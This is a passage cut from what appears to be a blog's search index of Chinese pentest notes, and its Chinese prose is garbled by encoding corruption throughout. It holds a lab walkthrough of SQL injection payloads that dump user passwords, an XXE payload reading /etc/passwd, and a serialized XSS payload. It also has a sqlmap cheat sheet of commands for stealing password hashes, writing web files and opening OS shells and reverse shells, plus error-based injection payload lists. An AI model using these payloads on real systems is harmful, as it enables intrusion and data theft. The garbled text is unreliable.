1,group_concat(schema_name) from information_schema.schemata--+\n```\n\n5.çˆ†è¡¨å\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin'  union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+\n```\n\n6.çˆ†åˆ—å\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin'  union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+\n```\n\n7.çˆ†æ•°æ®\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin'  union select (select group_concat(username) from users),((select group_concat(password) from users))--+\n```\n\n## æœç´¢å‹æ³¨å…¥\n\n1. åˆ¤æ–­æ³¨å…¥\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_search.php?name=1' \n```\nåŸºäº `'` æ³¨å…¥\n\n2. ä¸‡èƒ½å¯†ç \n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_search.php?name=1' or 1=1 --+\n```\nä¼šçˆ†å‡ºæ‰€æœ‰å¯†ç \n\n3. çŒœè§£åˆ—å\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_search.php?name=1' order by 3 --+ \n```\n3å›æ˜¾æ­£å¸¸,4æŠ¥é”™,è¯´æ˜æœ‰3åˆ—\n\n4. çˆ†æ•°æ®\nå¦‚ä¸Š\n   \n\n## xxå‹æ³¨å…¥\n1. åˆ¤æ–­æ³¨å…¥\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_x.php?name=1' --+\n```\næŠ¥é”™\n\n2. é—­åˆè¯­å¥\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_x.php?name=1')  and 1 = 1 --+\n```\nåŸºäº `')` å¼•èµ·çš„æ³¨å…¥\n\n3. çˆ†åº“\næ­¥éª¤å¦‚ä¸Š\n   \n   \n## insert&updateæ³¨å…¥\n\n\n### insert\næ³¨å†Œä¸ºinsertæ³¨å…¥,é¦–å…ˆæ³¨å†Œ\n\n1. åˆ¤æ–­æ³¨å…¥\n```bash\nadd=&email=&password=123&phonenum=&sex=&submit=submit&username=aa'\n```\nç”± `'` å¼•èµ·æŠ¥é”™\n\n2. çˆ†åº“\n```bash\nadd=&email=&password=qwe&phonenum=&sex=&submit=submit&username=123'  and extractvalue(0x0a,concat(0x0a,(select database())))  and '# \n```\nä½¿ç”¨æŠ¥é”™æ³¨å…¥,å¿…é¡»è¦æŠ¥é”™,æ‰€ä»¥ä½¿ç”¨ `and` è®©è¯­å¥æŠ¥é”™\n\n\n3. çˆ†è¡¨å \n```bash\nusername=123'  and extractvalue(0x0a,concat(0x0a,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,32)))  and  ' #\n```\nä½†æ˜¯æŠ¥é”™æ³¨å…¥`åªä¼šæŠ¥å‡º32ä¸ªå­—ç¬¦`,æ‰€ä»¥è¦ä½¿ç”¨åç§»é‡substr\n\n4. çˆ†åˆ—å\n```bash\nusername=123' and \nextractvalue (1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,32),0x7e)) and  ' #\n```\n\n5. çˆ†æ•°æ®\n```bash\n&username=123'  and extractvalue(0x0a,concat(0x0a,substr((select group_concat(username) from users),1,32)))  and  ' #\n\n&username=123'  and extractvalue(0x0a,concat(0x0a,substr((select group_concat(password) from users),1,32)))  and  ' #\n```\n\n### update\nä¿®æ”¹ä¸ªäººä¿¡æ¯ä¸ºupdateæ³¨å…¥,å…ˆæ³¨å†Œåç™»å½•\n\n1. åˆ¤æ–­æ³¨å…¥ç‚¹\n```bash\nadd=123'&email=111&phonenum=111&sex=%E7%94%B7&submit=submit\n```\nç”± `'` å¼•èµ·æŠ¥é”™\n\n2. çˆ†åº“å\n```bash\nadd=123' and extractvalue(0x0a,concat(0x0a,(select database()))) #&email=111&phonenum=111&sex=%E7%94%B7&submit=submit \n```\n\n3. çˆ†è¡¨å\n```bash\nadd=123' and extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) \n```\n\n4. åç»­æ“ä½œå¦‚ä¸Š\n\n\n## deleteæ³¨å…¥\n\n1. åˆ¤æ–­æ³¨å…¥\n```bash\n?id=56'  --+\n```\nç”± `'` å¼•èµ·æŠ¥é”™\n\n\n2. çˆ†åº“å\n```bash\n?id=56 and  extractvalue(0x0a,concat(0x0a,(select database()))) --+\n```\nä½¿ç”¨æŠ¥é”™æ³¨å…¥\n\n## httpå¤´æ³¨å…¥\n1. æŠ“åŒ…åˆ¤æ–­æ³¨å…¥\nç”± `'` å¼•èµ·çš„æ³¨å…¥\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151339050.png?token=ARYCSAQFEL42LGPO2MJ7EX3CQCJDS)\n\n\n2. æ³¨å…¥\n```bash\n1' and extractvalue(0x0a,concat(0x0a,(select database()))) and ' #\n```\næ­¤å¤„éœ€è¦ä½¿ç”¨ `and '` é—­åˆè¯­å¥\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151338332.png?token=ARYCSAT4PLVT4OXNI4EO4VTCQCJBA)\n\n\n## åŸºäºbooliançš„ç›²æ³¨\næ²¡æœ‰å›æ˜¾,ä¹Ÿæ²¡æœ‰æŠ¥é”™ä¿¡æ¯,sqlmapç›´æ¥æ¢­å“ˆ\n```bash\nsqlmap -u 'http://localhost/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2#' --batch --threads 10 --dbs \n```\n\n## åŸºäºæ—¶é—´çš„ç›²æ³¨\nsqlmapæ¢­å“ˆ\n\n\n## å®½å­—èŠ‚æ³¨å…¥\nåœ¨PHPé…ç½®æ–‡ä»¶ä¸­magic_quotes_gpc=Onæˆ–è€…ä½¿ç”¨addslasheså‡½æ•°ï¼Œicovå‡½æ•°,mysql_real_escape_stringå‡½æ•°ã€mysql_escape_stringå‡½æ•°ç­‰ï¼Œæäº¤çš„å‚æ•°ä¸­å¦‚æœå¸¦æœ‰å•å¼•å·'ï¼Œå°±ä¼šè¢«è‡ªåŠ¨è½¬ä¹‰\\'ï¼Œè¿™æ ·å°±ä½¿å¾—å¤šæ•°æ³¨å…¥æ”»å‡»æ— æ•ˆã€‚\nå½“è¾“å…¥å•å¼•å·ï¼Œå‡è®¾è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨addslashesè½¬ä¹‰ï¼Œå¯¹åº”çš„urlç¼–ç æ˜¯ï¼š\n`' â€“>\\'â€“> %5c%27`\nå½“åœ¨å‰é¢å¼•å…¥ä¸€ä¸ªASCIIå¤§äº128çš„å­—ç¬¦ã€æ¯”å¦‚%dfã€%aaã€‘ï¼Œurlç¼–ç å˜ä¸ºï¼š\n`%df' â€“> %df\\' â€“> (%df%5C)%27â€“>(æ•°æ®åº“GBK)â€“>é‹'`\nå‰ç«¯è¾“å…¥**%df'æ—¶é¦–å…ˆç»è¿‡ä¸Šé¢addslasheså‡½æ•°å’Œæµè§ˆå™¨urlç¼–ç è½¬ä¹‰å˜æˆäº†%df%5c%27**\nå› ä¸ºæ•°æ®åº“ä½¿ç”¨GBKç¼–ç çš„è¯ï¼Œ**%df%5cä¼šè¢«å½“ä½œä¸€ä¸ªæ±‰å­—å¤„ç†,è½¬æ¢æˆäº†æ±‰å­—â€é‹â€**ï¼Œä»è€Œä½¿%27ï¼ˆå•å¼•å·ï¼‰é€ƒå‡ºç”Ÿå¤©ï¼ŒæˆåŠŸç»•è¿‡,åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ä»è€Œå¯å®æ–½SQLæ³¨å…¥çš„åˆ©ç”¨ã€‚ [åŸæ–‡](https://jwt1399.top/posts/32179.html#toc-heading-75)\n\n1. çˆ†åˆ—æ•°\n```bash\nname=1%df'  union select 1,2# &submit=%E6%9F%A5%E8%AF%A2\n```\n2. çˆ†åº“å\n```bash\nname=1%df'  union select 1,database()# &submit=%E6%9F%A5%E8%AF%A2\n```\n\n#  unsafe upfileupload \næ–‡ä»¶ä¸Šä¼ \n\n## å®¢æˆ·ç«¯check\nå‰ç«¯æ ¡éªŒ,æŠ“åŒ…ä¿®æ”¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151515028.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151516450.png)\n\n## æœåŠ¡ç«¯check\næ£€æŸ¥MIME,ä¸€æ ·æŠ“åŒ…ä¿®æ”¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151529002.png)\n\n## getimagesize()\nä¸Šä¼ å›¾ç‰‡é©¬,é…åˆæ–‡ä»¶åŒ…å«æ¼æ´æˆ–è€…è§£ææ¼æ´\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151534906.png)\n\n\n\n# phpååºåˆ—åŒ–\n\næŠ“åŒ…å¯ä»¥å‘ç°æ˜¯postæ–¹å¼,å‚æ•°ä¸ºo\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021257491.png)\n\n## ä»£ç å®¡è®¡\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021256413.png)\n \nä»¥postæ¥å—ä¼ å‚oçš„å€¼,å¦‚æœæ˜¯åºåˆ—åŒ–æ•°æ®è¾“å‡ºåˆ°html,å¦åˆ™æ‰“å°\"\"å¤§å…„å¼Ÿ,æ¥ç‚¹åŠ²çˆ†ç‚¹å„¿çš„\"\n\n## æ„é€ payload\n\n```php\nclass S{\n    \n    var $test = \"<script>alert('xss')</script>\";\n}\n$a = new s();\necho(serialize($a));\n```\nè¾“å‡º\n```\nO:1:\"S\":1:{s:4:\"test\";s:29:\"<script>alert('xss')</script>\";}\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021304135.png)\n\n\n# SSRF\n    SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )\n    å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶\n    å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®\n    æ•°æ®æµ:æ”»å‡»è€…----->æœåŠ¡å™¨---->ç›®æ ‡åœ°å€\n    æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·\n    PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:\n```php\nfile_get_contents()\nfsockopen()\ncurl_exec()\n```\n\n## SSRF(CURL)\nè¯»å–æœ¬åœ°æ–‡ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202205232147803.png)\n\n\n## SSRF(file_get_contents)\nåŒä¸Š\n\n\n# XXE\n    XXE -\"xml external entity injection\"\n    æ—¢\"xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´\"ã€‚\n    æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯\"æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜\"\n    ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚\n    ç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æxmlçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„,ä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´ã€‚\n    ä»¥PHPä¸ºä¾‹,åœ¨PHPé‡Œé¢è§£æxmlç”¨çš„æ˜¯libxml,å…¶åœ¨â‰¥2.9.0çš„ç‰ˆæœ¬ä¸­,é»˜è®¤æ˜¯ç¦æ­¢è§£æxmlå¤–éƒ¨å®ä½“å†…å®¹çš„ã€‚\n\n##æ¼æ´å±å®³ï¼š\n1.è¯»å–ç³»ç»Ÿæ–‡ä»¶ï¼›\n\n2.æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼›\n\n3.æ¢æµ‹å†…ç½‘ç«¯å£ï¼›\n\n4.æ”»å‡»å†…éƒ¨ç½‘ç»œã€‚\n\n## æ¼æ´é˜²å¾¡ï¼š\nxxeæ¼æ´å­˜åœ¨æ˜¯å› ä¸ºXMLè§£æå™¨è§£æäº†ç”¨æˆ·å‘é€çš„ä¸å¯ä¿¡æ•°æ®ã€‚ç„¶è€Œï¼Œè¦å»æ ¡éªŒDTD(document type definition)ä¸­SYSTEMæ ‡è¯†ç¬¦å®šä¹‰çš„æ•°æ®ï¼Œå¹¶ä¸å®¹æ˜“ï¼Œä¹Ÿä¸å¤§å¯èƒ½ã€‚å¤§éƒ¨åˆ†çš„XMLè§£æå™¨é»˜è®¤å¯¹äºXXEæ”»å‡»æ˜¯è„†å¼±çš„ã€‚\nå› æ­¤ï¼Œæœ€å¥½çš„è§£å†³åŠæ³•å°±æ˜¯é…ç½®XMLå¤„ç†å™¨å»ä½¿ç”¨æœ¬åœ°é™æ€çš„DTDï¼Œä¸å…è®¸XMLä¸­å«æœ‰ä»»ä½•è‡ªå·±å£°æ˜çš„DTDã€‚é€šè¿‡è®¾ç½®ç›¸åº”çš„å±æ€§å€¼ä¸ºfalseï¼ŒXMLå¤–éƒ¨å®ä½“æ”»å‡»å°±èƒ½å¤Ÿè¢«é˜»æ­¢ã€‚å› æ­¤ï¼Œå¯å°†å¤–éƒ¨å®ä½“ã€å‚æ•°å®ä½“å’Œå†…è”DTD éƒ½è¢«è®¾ç½®ä¸ºfalseï¼Œä»è€Œé¿å…åŸºäºXXEæ¼æ´çš„æ”»å‡»ã€‚\næ„é€ ä¸€ä¸ªæ¶æ„çš„payloadï¼Œé€šè¿‡å¤–éƒ¨å®ä½“å¼•ç”¨ä»è€Œå»è·å–åå°æœåŠ¡å™¨çš„æœ¬åœ°æ–‡ä»¶ä¿¡æ¯(æ³¨ï¼šå¤–éƒ¨å¼•ç”¨å¯ä»¥æ”¯æŒhttpï¼Œfileï¼Œftpç­‰åè®®ã€‚)\n\n## payload\n```xml\n<?xml version = \"1.0\"?>\n\n<!DOCTYPE ANY [\n\n<!ENTITY f SYSTEM \"file:///etc/passwd\">\n\n]>\n\n<x>&f;</x>\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206031812341.png)","tags":["sqlæ³¨å…¥","é¶åœº"],"categories":["é¶åœº"]},{"title":"sqlmapä½¿ç”¨","url":"/2022/04/28/sqlmapä½¿ç”¨/","content":"## å‚æ•°\n- -u  #æ³¨å…¥ç‚¹ \n- -f  #æŒ‡çº¹åˆ¤åˆ«æ•°æ®åº“ç±»å‹ \n- -b  #è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ \n- -p  #æŒ‡å®šå¯æµ‹è¯•çš„å‚æ•°(?page=1&id=2 -p \"page,id\") \n- -D \"\"  #æŒ‡å®šæ•°æ®åº“å \n- -T \"\"  #æŒ‡å®šè¡¨å \n- -C \"\"  #æŒ‡å®šå­—æ®µ \n- -s \"\"  #ä¿å­˜æ³¨å…¥è¿‡ç¨‹åˆ°ä¸€ä¸ªæ–‡ä»¶,è¿˜å¯ä¸­æ–­ï¼Œä¸‹æ¬¡æ¢å¤åœ¨æ³¨å…¥(ä¿å­˜ï¼š-s \"xx.log\"ã€€ã€€æ¢å¤:-s \"xx.log\" --resume) \n- --level=(1-5) #è¦æ‰§è¡Œçš„æµ‹è¯•æ°´å¹³ç­‰çº§ï¼Œé»˜è®¤ä¸º1 \n- --risk=(0-3)  #æµ‹è¯•æ‰§è¡Œçš„é£é™©ç­‰çº§ï¼Œé»˜è®¤ä¸º1 \n- --time-sec=(2,5) #å»¶è¿Ÿå“åº”ï¼Œé»˜è®¤ä¸º5 \n- --data #é€šè¿‡POSTå‘é€æ•°æ® \n- --columns        #åˆ—å‡ºå­—æ®µ \n- --current-user   #è·å–å½“å‰ç”¨æˆ·åç§° \n- --current-db     #è·å–å½“å‰æ•°æ®åº“åç§° \n- --users          #åˆ—æ•°æ®åº“æ‰€æœ‰ç”¨æˆ· \n- --passwords      #æ•°æ®åº“ç”¨æˆ·æ‰€æœ‰å¯†ç  \n- --privileges     #æŸ¥çœ‹ç”¨æˆ·æƒé™(--privileges -U root) \n- -U               #æŒ‡å®šæ•°æ®åº“ç”¨æˆ· \n- --dbs            #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ \n- --tables -D \"\"   #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨ \n- --columns -T \"user\" -D \"mysql\"#åˆ—å‡ºmysqlæ•°æ®åº“ä¸­çš„userè¡¨çš„æ‰€æœ‰å­—æ®µ\n- --dump-all            #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨ \n- --exclude-sysdbs      #åªåˆ—å‡ºç”¨æˆ·è‡ªå·±æ–°å»ºçš„æ•°æ®åº“å’Œè¡¨ \n- --dump -T \"\" -D \"\" -C \"\"   #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„å­—æ®µçš„æ•°æ®(--dump -T users -D master -C surname) \n- --dump -T \"\" -D \"\" --start 2 --top 4  # åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„2-4å­—æ®µçš„æ•°æ® \n- --dbms    #æŒ‡å®šæ•°æ®åº“(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) \n- --os      #æŒ‡å®šç³»ç»Ÿ(Linux,Windows) \n- -v  #è¯¦ç»†çš„ç­‰çº§(0-6)     0ï¼šåªæ˜¾ç¤ºPythonçš„å›æº¯ï¼Œé”™è¯¯å’Œå…³é”®æ¶ˆæ¯ã€‚ \n    1.æ˜¾ç¤ºä¿¡æ¯å’Œè­¦å‘Šæ¶ˆæ¯ã€‚ \n    2ï¼šæ˜¾ç¤ºè°ƒè¯•æ¶ˆæ¯ã€‚ \n    3ï¼šæœ‰æ•ˆè½½è·æ³¨å…¥ã€‚ \n    4ï¼šæ˜¾ç¤ºHTTPè¯·æ±‚ã€‚ \n    5ï¼šæ˜¾ç¤ºHTTPå“åº”å¤´ã€‚ \n    6ï¼šæ˜¾ç¤ºHTTPå“åº”é¡µé¢çš„å†…å®¹ \n- --privileges  #æŸ¥çœ‹æƒé™ \n- --is-dba      #æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ \n- --roles       #æšä¸¾æ•°æ®åº“ç”¨æˆ·è§’è‰² \n- --udf-inject  #å¯¼å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆè·å–ç³»ç»Ÿæƒé™ï¼‰ \n- --union-check  #æ˜¯å¦æ”¯æŒunion æ³¨å…¥ \n- --union-cols #union æŸ¥è¯¢è¡¨è®°å½• \n- --union-test #union è¯­å¥æµ‹è¯• \n- --union-use  #é‡‡ç”¨union æ³¨å…¥ \n- --union-tech orderby #unioné…åˆorder by \n- --data \"\" #POSTæ–¹å¼æäº¤æ•°æ®(--data \"page=1&id=2\") \n- --cookie \"ç”¨;å·åˆ†å¼€\"      #cookieæ³¨å…¥(--cookies=â€PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=lowâ€) --referer \"\"     #ä½¿ç”¨refereræ¬ºéª—(--referer \"http://\") \n- --user-agent \"\"  #è‡ªå®šä¹‰user-agent\n- --random-agent #éšæœºua \n- -- tamper #ä½¿ç”¨é˜²è¿‡æ»¤è„šæœ¬ \n- --proxy \"http://127.0.0.1:8118\" #ä»£ç†æ³¨å…¥ \n- --string=\"\"    #æŒ‡å®šå…³é”®è¯,å­—ç¬¦ä¸²åŒ¹é…. \n- --threads ã€€ã€€  #é‡‡ç”¨å¤šçº¿ç¨‹(--threads 3) \n- --sql-shell    #æ‰§è¡ŒæŒ‡å®šsqlå‘½ä»¤ \n- --sql-query    #æ‰§è¡ŒæŒ‡å®šçš„sqlè¯­å¥(--sql-query \"SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1\" ) \n- --file-read    #è¯»å–æŒ‡å®šæ–‡ä»¶ \n- --file-write   #å†™å…¥æœ¬åœ°æ–‡ä»¶(--file-write /test/test.txt --file-dest /var/www/html/1.txt;å°†æœ¬åœ°çš„test.txtæ–‡ä»¶å†™å…¥åˆ°ç›®æ ‡çš„1.txt) \n- --file-dest    #è¦å†™å…¥çš„æ–‡ä»¶ç»å¯¹è·¯å¾„ \n- --os-cmd=id    #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ \n- --os-shell     #ç³»ç»Ÿäº¤äº’shell \n- --os-pwn       #åå¼¹shell(--os-pwn --msf-path=/opt/framework/msf3/) \n- --msf-path=    #matesploitç»å¯¹è·¯å¾„(--msf-path=/opt/framework/msf3/) \n- --os-smbrelay  # \n- --os-bof       # \n- --reg-read     #è¯»å–winç³»ç»Ÿæ³¨å†Œè¡¨ \n- --priv-esc     # \n- --time-sec=    #å»¶è¿Ÿè®¾ç½® é»˜è®¤--time-sec=5 ä¸º5ç§’ -p \"user-agent\" --user-agent \"sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)\"  #æŒ‡å®šuser-agentæ³¨å…¥ \n- --eta          #ç›²æ³¨ /pentest/database/sqlmap/txt/common-columns.txtã€€ã€€å­—æ®µå­—å…¸ã€€ã€€ã€€ \n    common-outputs.txt \n    common-tables.txt      è¡¨å­—å…¸ \n    keywords.txt \n    oracle-default-passwords.txt \n    user-agents.txt \n    wordlist.txt \n## å¸¸ç”¨è¯­å¥\n```bash\n1. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0\n \n2. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2\n \n3. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2\n \n4. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C \"user,pass\"  -v 1 --exclude-sysdbs\n \n5. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 \n\n6. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read \"c:\\boot.ini\" -v 2 \n\n7. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2\n \n8. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd \"id\" -v 1 \n\n9. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 \n\n10. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1\n \n11. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1\n \n12. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1\n \n13. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=\"HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmap\" --reg-value=Test --reg-type=REG_SZ --reg-data=1\n \n14. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta\n \n15. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -p id --prefix \"')\" --suffix \"AND ('abc'='abc\"\n\n16. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --auth-type Basic --auth-cred \"testuser:testpass\"\n\n17. /sqlmap.py -l burp.log --scope=\"(www)?\\.target\\.(com|net|org)\"\n\n18. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3\n \n19. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --sql-query \"SELECT 'foo'\" -v 1\n \n20. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --common-tables -D testdb --banner\n \n21. /sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --cookie=\"PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low\" --string='xx' --dbs --level=3 -p \"uid\"\n```\n\n\n## æ³¨å…¥æµç¨‹\n1. è¯»å–æ•°æ®åº“ç‰ˆæœ¬ï¼Œå½“å‰ç”¨æˆ·ï¼Œå½“å‰æ•°æ®åº“ \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 \n```\n\n2. åˆ¤æ–­å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™\n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U ç”¨æˆ·å -v 1 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U ç”¨æˆ·å -v 1 \n```\n\n3. è¯»å–æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·æˆ–æŒ‡å®šæ•°æ®åº“ç”¨æˆ·çš„å¯†ç \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 \n```\n\n4. è·å–æ‰€æœ‰æ•°æ®åº“ \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 \n```\n\n5. è·å–æŒ‡å®šæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2\n``` \n\n6. è·å–æŒ‡å®šæ•°æ®åº“åä¸­æŒ‡å®šè¡¨çš„å­—æ®µ \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2\n```\n \n7. è·å–æŒ‡å®šæ•°æ®åº“åä¸­æŒ‡å®šè¡¨ä¸­æŒ‡å®šå­—æ®µçš„æ•°æ® \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C \"username,password\" -s \"sqlnmapdb.log\" -v 2 \n```\n8. file-readè¯»å–webæ–‡ä»¶ \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read \"/etc/passwd\" -v 2\n``` \n9. file-writeå†™å…¥æ–‡ä»¶åˆ°web \n```bash\nsqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file #ä½¿ç”¨sqlmapç»•è¿‡é˜²ç«å¢™è¿›è¡Œæ³¨å…¥æµ‹è¯•\n```","tags":["å·¥å…·","sqlmap"],"categories":["å·¥å…·ä½¿ç”¨"]},{"title":"SQLæ³¨å…¥é¶åœºsqli-labs","url":"/2022/04/24/SQLæ³¨å…¥é¶åœºsqli-labs/","content":"# sqlæ³¨å…¥\nSQLæ³¨å…¥æ˜¯ä¸€ç§ä»£ç æ³¨å…¥æŠ€æœ¯ï¼Œç”¨äºæ”»å‡»æ•°æ®é©±åŠ¨çš„åº”ç”¨ç¨‹åºã€‚ åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œå¦‚æœæ²¡æœ‰åšæ°å½“çš„è¿‡æ»¤ï¼Œåˆ™å¯èƒ½ä½¿å¾—æ¶æ„çš„SQLè¯­å¥è¢«æ’å…¥è¾“å…¥å­—æ®µä¸­æ‰§è¡Œï¼ˆä¾‹å¦‚å°†æ•°æ®åº“å†…å®¹è½¬å‚¨ç»™æ”»å‡»è€…ï¼‰\n\n## å¸¸è§çš„æ³¨å…¥ç‚¹\n- GET/POST/PUT/DELETEå‚æ•°\n- X-Forwarded-For\n- æ–‡ä»¶å\n- 4.1.2.2. Fuzzæ³¨å…¥ç‚¹\n- ' / \"\n- 1/1\n- 1/0\n- and 1=1\n- \" and \"1\"=\"1\n- and 1=2 \n- or 1=1\n- or 1=\n- ' and '1'='1\n- \\+ - ^ * % /\n- << >> || | & &&\n- ~\n- !\n- @\n- åå¼•å·æ‰§è¡Œ\n\n## 4.1.2.3. æµ‹è¯•ç”¨å¸¸é‡\n```bash\n@@version\n@@servername\n@@language\n@@spid\n@@database\n@@user\n@@version_compile_os\n```\n## æµ‹è¯•åˆ—æ•°\n\n```bash\nhttps://www.xxx.com/index.asp?id=12+union+select+null,null--\n```\n\n## æŠ¥é”™æ³¨å…¥\n```bash\n- select 1/0\n- select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a\n- extractvalue(1, concat(0x5c,(select user())))\n- updatexml(0x3a,concat(1,(select user())),1)\n- exp(~(SELECT * from(select user())a))\n- ST_LatFromGeoHash((select * from(select * from(select user())a)b))\n- GTID_SUBSET(version(), 1)\n```\n\n\n## åŸºäºgeometricçš„æŠ¥é”™æ³¨å…¥\n```bash\n- 